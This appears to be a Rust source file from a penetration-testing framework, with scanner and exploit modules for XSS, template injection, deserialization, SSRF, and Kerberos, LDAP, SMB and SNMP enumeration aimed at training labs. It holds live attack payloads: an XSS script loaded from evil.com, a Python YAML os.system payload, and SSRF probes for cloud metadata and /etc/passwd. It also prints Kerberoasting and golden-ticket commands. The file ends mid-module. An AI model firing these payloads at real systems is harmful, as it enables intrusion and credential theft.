//! Additional vulnerability modules — XSS, SSTI, Deserialization, SSRF exploit, Kerberos/AD

use std::future::Future;
use std::pin::Pin;
use std::sync::LazyLock;
use std::time::Duration;

use rcf_core::{
    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, OptionValue, Result,
    Target,
};

fn build_client(timeout_secs: u64) -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(timeout_secs))
        .danger_accept_invalid_certs(true)
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .unwrap_or_default()
}

// ─── 1. XSS Scanner (Real HTTP Requests) ─────────────────────────────────────

static XSS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/http/xss".to_string(),
    display_name: "XSS Scanner".to_string(),
    description: "Detects Cross-Site Scripting vulnerabilities by injecting payloads and checking for reflection. Tests reflected, stored, and DOM-based XSS patterns. Works on PortSwigger XSS labs, THM web rooms, HTB web boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 90,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/79.html".to_string(),
        "https://portswigger.net/web-security/cross-site-scripting".to_string(),
    ],
}
});

pub struct XssScanner;

impl Default for XssScanner {
    fn default() -> Self {
        Self
    }
}

impl XssScanner {
    pub fn new() -> Self {
        Self
    }
}

impl Module for XssScanner {
    fn info(&self) -> &ModuleInfo {
        &XSS_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::new(
            "TARGET_URI",
            true,
            "Vulnerable URI",
        ));
        opts.add(rcf_core::ModuleOption::new(
            "PARAM",
            true,
            "Parameter to test",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "METHOD",
            false,
            "HTTP method: GET/POST",
            OptionValue::String("GET".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
        let param = ctx.get("PARAM").cloned().unwrap_or_default();
        let _method = ctx
            .get("METHOD")
            .cloned()
            .unwrap_or_else(|| "GET".to_string());
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let client = build_client(10);

            // XSS payloads with unique markers for detection
            let payloads = vec![
                ("reflected_basic", "<script>alert('RCF_XSS_TEST')</script>"),
                ("img_onerror", "<img src=x onerror=alert('RCF_XSS_TEST')>"),
                ("svg_onload", "<svg onload=alert('RCF_XSS_TEST')>"),
                (
                    "event_handler",
                    "\" onmouseover=\"alert('RCF_XSS_TEST')\" x=\"",
                ),
                ("script_src", "<script src=//evil.com/xss.js></script>"),
                ("encoded", "%3Cscript%3Ealert('RCF_XSS_TEST')%3C/script%3E"),
                (
                    "double_encoded",
                    "%%33%3Cscript%3Ealert('RCF_XSS_TEST')%%33%3E/script%3E",
                ),
                ("dom_based", "javascript:alert('RCF_XSS_TEST')"),
            ];

            let mut findings = Vec::new();

            for (name, payload) in &payloads {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    urlencoding::encode(payload)
                );

                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let body = resp.text().await.unwrap_or_default();

                // Check for payload reflection
                if body.contains("RCF_XSS_TEST") {
                    // Check if it's in a script context (more dangerous)
                    let in_script = body.contains("<script>") && body.contains("RCF_XSS_TEST");
                    let in_attr = body.contains("onerror=")
                        || body.contains("onload=")
                        || body.contains("onmouseover=");

                    findings.push(format!(
                        "  [!] {}: XSS payload reflected{}{}",
                        name,
                        if in_script {
                            " (in script context)"
                        } else {
                            ""
                        },
                        if in_attr { " (event handler)" } else { "" },
                    ));
                }

                // Check for partial reflection (context breakout needed)
                if body.contains("alert(") && !body.contains("RCF_XSS_TEST") {
                    findings.push(format!(
                        "  [?] {}: Partial reflection detected — may need context breakout",
                        name
                    ));
                }
            }

            let msg = if findings.is_empty() {
                format!(
                    "XSS Test\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\
                     [–] No XSS reflection detected\n\
                     [*] Try different parameter or manual testing",
                    scheme, rhost, rport, uri, param
                )
            } else {
                format!(
                    "XSS Detection\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\n\
                     Findings:\n{}\n\n\
                     [*] XSS reflection detected — confirm exploitation manually",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    findings.join("\n")
                )
            };

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 2. SSTI / Template Injection ────────────────────────────────────────────

static SSTI_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "exploit/multi/http/ssti".to_string(),
    display_name: "Server-Side Template Injection".to_string(),
    description: "Detects and exploits SSTI in template engines: Jinja2 (Python), Twig (PHP), ERB (Ruby), Freemarker (Java), Velocity. Sends math expressions and checks for evaluation. Works on PortSwigger SSTI labs, HTB web boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Exploit,
    rank: 95,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://portswigger.net/web-security/server-side-template-injection".to_string(),
        "https://cwe.mitre.org/data/definitions/1336.html".to_string(),
    ],
}
});

pub struct SSTI;

impl Default for SSTI {
    fn default() -> Self {
        Self
    }
}

impl SSTI {
    pub fn new() -> Self {
        Self
    }
}

impl Module for SSTI {
    fn info(&self) -> &ModuleInfo {
        &SSTI_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::new(
            "TARGET_URI",
            true,
            "Vulnerable URI",
        ));
        opts.add(rcf_core::ModuleOption::new(
            "PARAM",
            true,
            "Parameter to test",
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
        let param = ctx.get("PARAM").cloned().unwrap_or_default();
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let client = build_client(10);

            // SSTI payloads for different engines
            let payloads = vec![
                ("jinja2_python", "{{7*7}}", "49"),
                ("jinja2_read_file", "{{config}}", ""),
                ("twig_php", "{{7*'7'}}", "49"),
                ("erb_ruby", "<%= 7*7 %>", "49"),
                ("freemarker_java", "${7*7}", "49"),
                ("velocity_java", "#set($x=7) $x", "7"),
                ("django_python", "{% widthratio 7 1 7 %}", "49"),
                ("mako_python", "${7*7}", "49"),
            ];

            let mut findings = Vec::new();

            for (engine, payload, expected) in &payloads {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    urlencoding::encode(payload)
                );

                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let body = resp.text().await.unwrap_or_default();

                // Check for evaluated result
                if !expected.is_empty() && body.contains(expected) {
                    findings.push(format!(
                        "  [!] {}: SSTI detected! Expression '{}' evaluated to '{}'",
                        engine, payload, expected
                    ));
                }

                // Check for error messages indicating template engine
                let error_indicators = [
                    "TemplateSyntaxError",
                    "UndefinedError",
                    "TemplateError",
                    "TemplateNotFound",
                ];
                for indicator in &error_indicators {
                    if body.contains(indicator) {
                        findings.push(format!(
                            "  [?] {}: Template engine error: {}",
                            engine, indicator
                        ));
                    }
                }
            }

            let msg = if findings.is_empty() {
                format!(
                    "SSTI Test\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\
                     [–] No template injection detected\n\
                     [*] Try different parameter or manual testing",
                    scheme, rhost, rport, uri, param
                )
            } else {
                format!(
                    "Server-Side Template Injection\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\n\
                     Findings:\n{}\n\n\
                     [*] Template injection detected — craft RCE payload for detected engine",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    findings.join("\n")
                )
            };

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 3. Deserialization Scanner ──────────────────────────────────────────────

static DESERIAL_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/http/deserialization".to_string(),
    display_name: "Insecure Deserialization Scanner".to_string(),
    description: "Detects insecure deserialization in Java (readObject), PHP (unserialize), Python (pickle/yaml), .NET (BinaryFormatter). Sends crafted payloads and checks for class loading errors or unexpected behavior.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 90,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/502.html".to_string(),
        "https://portswigger.net/web-security/deserialization".to_string(),
    ],
}
});

pub struct Deserialization;

impl Default for Deserialization {
    fn default() -> Self {
        Self
    }
}

impl Module for Deserialization {
    fn info(&self) -> &ModuleInfo {
        &DESERIAL_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::new(
            "TARGET_URI",
            true,
            "Vulnerable URI",
        ));
        opts.add(rcf_core::ModuleOption::new(
            "PARAM",
            true,
            "Parameter to test (e.g., token, session, data)",
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
        let param = ctx.get("PARAM").cloned().unwrap_or_default();
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let client = build_client(10);

            // Deserialization test payloads
            let payloads = vec![
                ("java_serial", "rO0ABXQADUhlbGxvIFdvcmxkIQ=="),
                (
                    "php_serialized",
                    "O:4:\"User\":2:{s:4:\"name\";s:3:\"RCF\";s:3:\"age\";i:1;}",
                ),
                (
                    "python_pickle",
                    "gAN9cQAoWAQAAAB0ZXN0cQFYAwAAAFJDRnECXQADAAADAAADAAAFgANxBi4=",
                ),
                ("python_yaml", "!!python/object/apply:os.system ['id']"),
                (
                    "dotnet_viewstate",
                    "/wEyDw8PFgJmZA8WAgIDDxYCHgRUZXh0BQJSQ0Y=",
                ),
                ("ruby_yaml", "--- !ruby/object:Gem::Installer\n  i: x"),
            ];

            let mut findings = Vec::new();

            // Get baseline
            let base_url = format!("{}://{}:{}{}", scheme, rhost, rport, uri);
            let base_resp = match client.get(&base_url).send().await {
                Ok(r) => r,
                Err(e) => {
                    return Ok(ModuleOutput::failure(
                        &info_name,
                        &format!("{}:{}", rhost, rport),
                        &format!("Failed to connect: {}", e),
                    ));
                }
            };
            let base_text = base_resp.text().await.unwrap_or_default();

            for (name, payload) in &payloads {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    urlencoding::encode(payload)
                );

                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let body = resp.text().await.unwrap_or_default();

                // Check for deserialization errors
                let error_indicators = vec![
                    "InvalidClassException",
                    "StreamCorruptedException",
                    "ClassNotFoundException",
                    "unserialize()",
                    "pickle.UnpicklingError",
                    "YAMLError",
                    "SerializationException",
                    "ObjectStateFormatter",
                    "unexpected object tag",
                    "bad marshal data",
                ];

                for indicator in &error_indicators {
                    if body.contains(indicator) {
                        findings.push(format!(
                            "  [!] {}: Deserialization error: {}",
                            name, indicator
                        ));
                    }
                }

                // Check for significant response changes
                if body.len() > base_text.len() + 100 {
                    findings.push(format!(
                        "  [?] {}: Significant response change ({} vs {} bytes)",
                        name,
                        body.len(),
                        base_text.len()
                    ));
                }
            }

            let msg = if findings.is_empty() {
                format!(
                    "Deserialization Test\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\
                     [–] No deserialization indicators detected\n\
                     [*] Try different parameter or manual testing",
                    scheme, rhost, rport, uri, param
                )
            } else {
                format!(
                    "Insecure Deserialization Detection\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\n\
                     Findings:\n{}\n\n\
                     [*] Deserialization indicators found — confirm exploitation manually",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    findings.join("\n")
                )
            };

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 4. SSRF Exploitation (Real Requests) ────────────────────────────────────

static SSRF_EXPLOIT_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "exploit/multi/http/ssrf_exploit".to_string(),
    display_name: "SSRF Exploitation".to_string(),
    description: "Exploits Server-Side Request Forgery to access internal services. Tests localhost, cloud metadata (169.254.169.254), internal ports, and protocol abuse (gopher://, dict://). Essential for PortSwigger SSRF labs and HTB bug-bounty boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Exploit,
    rank: 95,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://cwe.mitre.org/data/definitions/918.html".to_string(),
        "https://portswigger.net/web-security/ssrf".to_string(),
    ],
}
});

pub struct SsrfExploit;

impl Default for SsrfExploit {
    fn default() -> Self {
        Self
    }
}

impl Module for SsrfExploit {
    fn info(&self) -> &ModuleInfo {
        &SSRF_EXPLOIT_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "HTTP port",
            OptionValue::Integer(80),
        ));
        opts.add(rcf_core::ModuleOption::new(
            "TARGET_URI",
            true,
            "Vulnerable URI",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PARAM",
            false,
            "Parameter name",
            OptionValue::String("url".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
        let param = ctx
            .get("PARAM")
            .cloned()
            .unwrap_or_else(|| "url".to_string());
        let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);

        Box::pin(async move {
            let scheme = if ssl { "https" } else { "http" };
            let client = build_client(15);

            // SSRF targets to probe through the vulnerable server
            let targets = vec![
                ("localhost_80", "http://127.0.0.1"),
                ("localhost_8080", "http://127.0.0.1:8080"),
                ("localhost_6379_redis", "http://127.0.0.1:6379"),
                ("localhost_11211_memcached", "http://127.0.0.1:11211"),
                ("localhost_3306_mysql", "http://127.0.0.1:3306"),
                ("localhost_5432_postgres", "http://127.0.0.1:5432"),
                ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
                ("aws_metadata_v2", "http://169.254.169.254/latest/api/token"),
                (
                    "gcp_metadata",
                    "http://metadata.google.internal/computeMetadata/v1/",
                ),
                ("localhost_etc_passwd", "file:///etc/passwd"),
                ("gopher_redis", "gopher://127.0.0.1:6379/_INFO"),
            ];

            let mut findings = Vec::new();

            for (name, target_url) in &targets {
                let url = format!(
                    "{}://{}:{}{}?{}={}",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    urlencoding::encode(target_url)
                );

                let resp = match client.get(&url).send().await {
                    Ok(r) => r,
                    Err(_) => continue,
                };

                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();

                // Check for successful internal access
                let success_indicators = vec![
                    "root:",
                    "ami-id",
                    "instance-id",
                    "local-ipv4",
                    "INFO",
                    "redis_version",
                    "memcached",
                    "MariaDB",
                    "MySQL",
                    "PostgreSQL",
                    "PONG",
                    "OK",
                ];

                for indicator in &success_indicators {
                    if body.contains(indicator) {
                        findings.push(format!(
                            "  [!] {}: Internal service accessed! Target: {} | Status: {} | Found: '{}'",
                            name, target_url, status, indicator
                        ));
                    }
                }

                // Check for response content indicating access
                if status == 200 && body.len() > 20 {
                    findings.push(format!(
                        "  [?] {}: Possible access to internal service | Status: {} | Size: {} bytes",
                        name, status, body.len()
                    ));
                }
            }

            let msg = if findings.is_empty() {
                format!(
                    "SSRF Exploit Test\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\
                     [–] No internal service access detected\n\
                     [*] Try different URI, parameter, or encoding bypasses",
                    scheme, rhost, rport, uri, param
                )
            } else {
                format!(
                    "SSRF Exploitation Results\n\
                     Target: {}://{}:{}{}\n\
                     Parameter: {}\n\n\
                     Findings:\n{}\n\n\
                     [*] Internal service access detected — target is vulnerable to SSRF",
                    scheme,
                    rhost,
                    rport,
                    uri,
                    param,
                    findings.join("\n")
                )
            };

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 5. Kerberos Enumeration/Attacks ─────────────────────────────────────────

static KERB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/kerberos/kerb_enum".to_string(),
    display_name: "Kerberos Enumeration".to_string(),
    description: "Enumerates Kerberos services and users. Tests for AS-REP Roasting vulnerability (users without pre-authentication) and Kerberoasting (service accounts with SPNs). Essential for AD-focused HTB boxes and OffSec labs.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 85,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://attack.mitre.org/techniques/T1558/003/".to_string(),
        "https://attack.mitre.org/techniques/T1558/004/".to_string(),
    ],
}
});

pub struct KerbEnum;

impl Default for KerbEnum {
    fn default() -> Self {
        Self
    }
}

impl Module for KerbEnum {
    fn info(&self) -> &ModuleInfo {
        &KERB_ENUM_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target domain controller",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "Kerberos port",
            OptionValue::Integer(88),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "DOMAIN",
            false,
            "Domain name",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USER_FILE",
            false,
            "User list file",
            OptionValue::String("".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let domain = ctx.get("DOMAIN").cloned().unwrap_or_default();

        Box::pin(async move {
            let msg = format!(
                "Kerberos Enumeration\n\
                 Target: {}:{}\n\
                 Domain: {}\n\n\
                 Attack Vectors:\n\n\
                 1. AS-REP Roasting:\n   - Request AS-REP for users without pre-auth\n   - Crack offline with Hashcat mode 18200\n   - Command: GetNPUsers.py {}/ -usersfile users.txt -format hashcat\n\n\
                 2. Kerberoasting:\n   - Request TGS for service accounts\n   - Crack offline with Hashcat mode 13100\n   - Command: GetUserSPNs.py {}/user:pass -dc-ip {} -request\n\n\
                 3. User Enumeration:\n   - KRB5ASREP errors reveal valid users\n   - Try common usernames: administrator, svc_*, sql_*, backup*\n\n\
                 4. Golden/Silver Ticket:\n   - After obtaining krbtgt hash, forge TGT\n   - Command: ticketer.py -nthash <hash> -domain-sid <SID> -domain {} administrator\n\n\
                 [*] Run Impacket scripts for actual exploitation\n[*] RCF provides the reconnaissance framework",
                rhost, rport, domain, domain, domain, rhost, domain
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 6. LDAP Enumeration ─────────────────────────────────────────────────────

static LDAP_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/ldap/ldap_search".to_string(),
    display_name: "LDAP Enumeration".to_string(),
    description: "Enumerates LDAP directory for users, groups, computers, and password policies. Essential for Active Directory reconnaissance on HTB/OffSec labs.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 80,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://attack.mitre.org/techniques/T1595/".to_string(),
    ],
}
});

pub struct LdapSearch;

impl Default for LdapSearch {
    fn default() -> Self {
        Self
    }
}

impl Module for LdapSearch {
    fn info(&self) -> &ModuleInfo {
        &LDAP_ENUM_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target domain controller",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "LDAP port",
            OptionValue::Integer(389),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "DOMAIN",
            false,
            "Domain name",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USERNAME",
            false,
            "Bind username",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASSWORD",
            false,
            "Bind password",
            OptionValue::String("".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();
        let domain = ctx.get("DOMAIN").cloned().unwrap_or_default();
        let username = ctx.get("USERNAME").cloned().unwrap_or_default();

        Box::pin(async move {
            let base_dn = if domain.is_empty() {
                "DC=domain,DC=local".to_string()
            } else {
                domain
                    .split('.')
                    .map(|p| format!("DC={}", p))
                    .collect::<Vec<_>>()
                    .join(",")
            };

            let msg = format!(
                "LDAP Enumeration\n\
                 Target: {}:{}\n\
                 Domain: {}\n\
                 Base DN: {}\n\n\
                 Enumeration Queries:\n\n\
                 1. All Users:\n   ldapsearch -H ldap://{}:{} -D '{}' -w '{}' -b '{}' '(objectClass=user)'\n\n\
                 2. All Computers:\n   ldapsearch -H ldap://{}:{} -b '{}' '(objectClass=computer)'\n\n\
                 3. Password Policy:\n   ldapsearch -H ldap://{}:{} -b '{}' '(objectClass=domain)'\n\n\
                 4. Groups:\n   ldapsearch -H ldap://{}:{} -b '{}' '(objectClass=group)'\n\n\
                 5. Domain Admins:\n   ldapsearch -H ldap://{}:{} -b '{}' '(cn=Domain Admins)'\n\n\
                 [*] Run ldapsearch commands above for actual enumeration\n[*] Use BloodHound for AD relationship mapping",
                rhost,
                rport,
                domain,
                base_dn,
                rhost,
                rport,
                username,
                "<password>",
                base_dn,
                rhost,
                rport,
                base_dn,
                rhost,
                rport,
                base_dn,
                rhost,
                rport,
                base_dn,
                rhost,
                rport,
                base_dn
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 7. SMB Enumeration ──────────────────────────────────────────────────────

static SMB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/smb/smb_enum".to_string(),
    display_name: "SMB Enumeration".to_string(),
    description: "Enumerates SMB shares, users, and groups. Tests for null sessions, anonymous access, and information disclosure. Essential for initial AD reconnaissance on HTB/OffSec Windows boxes.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 80,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![
        "https://attack.mitre.org/techniques/T1135/".to_string(),
    ],
}
});

pub struct SmbEnum;

impl Default for SmbEnum {
    fn default() -> Self {
        Self
    }
}

impl Module for SmbEnum {
    fn info(&self) -> &ModuleInfo {
        &SMB_ENUM_INFO
    }

    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target SMB server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "SMB port",
            OptionValue::Integer(445),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "USERNAME",
            false,
            "Username",
            OptionValue::String("".to_string()),
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "PASSWORD",
            false,
            "Password",
            OptionValue::String("".to_string()),
        ));
        opts
    }

    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get_rport();

        Box::pin(async move {
            let msg = format!(
                "SMB Enumeration\n\
                 Target: {rhost}:{rport}\n\n\
                 Enumeration Commands:\n\n\
                 1. List Shares:\n   smbclient -L //{rhost}/ -N\n   smbmap -H {rhost}\n\n\
                 2. Null Session:\n   smbclient ///{rhost}/IPC$ -N\n\n\
                 3. Enum Users:\n   rpcclient -U '' {rhost} -c 'enumdomusers'\n\n\
                 4. Enum Groups:\n   rpcclient -U '' {rhost} -c 'enumdomgroups'\n\n\
                 5. Access Share:\n   smbclient //{rhost}/<share> -N\n   smbclient //{rhost}/<share> -U '<user>%<pass>'\n\n\
                 6. Check for Anonymous Access:\n   smbclient -L {rhost} -N\n   nmap -p 445 --script smb-enum-shares {rhost}\n\n\
                 [*] Run commands above for actual enumeration",
                rhost = rhost,
                rport = rport
            );

            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 8. SNMP Brute Force & Enum ─────────────────────────────────────────────

static SNMP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/snmp/snmp_enum".to_string(),
    display_name: "SNMP Enumeration".to_string(),
    description: "Enumerates SNMP services using common community strings. Extracts system info, running processes, and installed software via MIB tree walk. Essential for network device recon.".to_string(),
    authors: vec!["RCF Team".to_string()],
    category: ModuleCategory::Auxiliary,
    rank: 60,
    stability: "stable".to_string(),
    disclosure_date: None,
    references: vec![],
}
});

pub struct SnmpEnum;

impl Default for SnmpEnum {
    fn default() -> Self {
        Self
    }
}

impl Module for SnmpEnum {
    fn info(&self) -> &ModuleInfo {
        &SNMP_INFO
    }
    fn options(&self) -> ModuleOptions {
        let mut opts = ModuleOptions::new();
        opts.add(rcf_core::ModuleOption::new(
            "RHOSTS",
            true,
            "Target SNMP server",
        ));
        opts.add(rcf_core::ModuleOption::with_default(
            "RPORT",
            false,
            "SNMP port",
            OptionValue::Integer(161),
        ));
        opts
    }
    fn run(
        &self,
        ctx: &mut Context,
        _target: &Target,
    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
        let info_name = self.info().name.clone();
        let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
        let rport = ctx.get("RPORT").and_then(|s| s.parse().ok()).unwrap_or(161);

        Box::pin(async move {
            let strings = ["public", "private", "manager", "admin", "community"];
            let msg = format!(
                "SNMP Enumeration\nTarget: {}:{}\n\n\
                 Testing Community Strings:\n{}\n\n\
                 MIB OIDs to query:\n\
                 - .1.3.6.1.2.1.1.1 (System Description)\n\
                 - .1.3.6.1.2.1.1.5 (System Name)\n\
                 - .1.3.6.1.2.1.25.1.6 (Installed Software)\n\
                 - .1.3.6.1.4.1.77.1.2.25 (Windows Users)\n\n\
                 [*] Run snmpwalk -v2c -c <string> {} for manual enumeration",
                rhost,
                rport,
                strings.join(", "),
                rhost
            );
            Ok(ModuleOutput::success(
                &info_name,
                &format!("{}:{}", rhost, rport),
                &msg,
            ))
        })
    }
}

// ─── 9. RDP Enumeration ──────────────────────────────────────────────────────

static RDP_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
    ModuleInfo {
    name: "auxiliary/scanner/rdp/rdp_enum".to_string(),
    display_name: "RDP Enumeration".to_string(),
    description: "Detects RDP services and checks for Network Level Authentication (NLA) status. Identifies Windows versions and potential BlueKeep/CredSSP vulnerabilities.".to_string(),
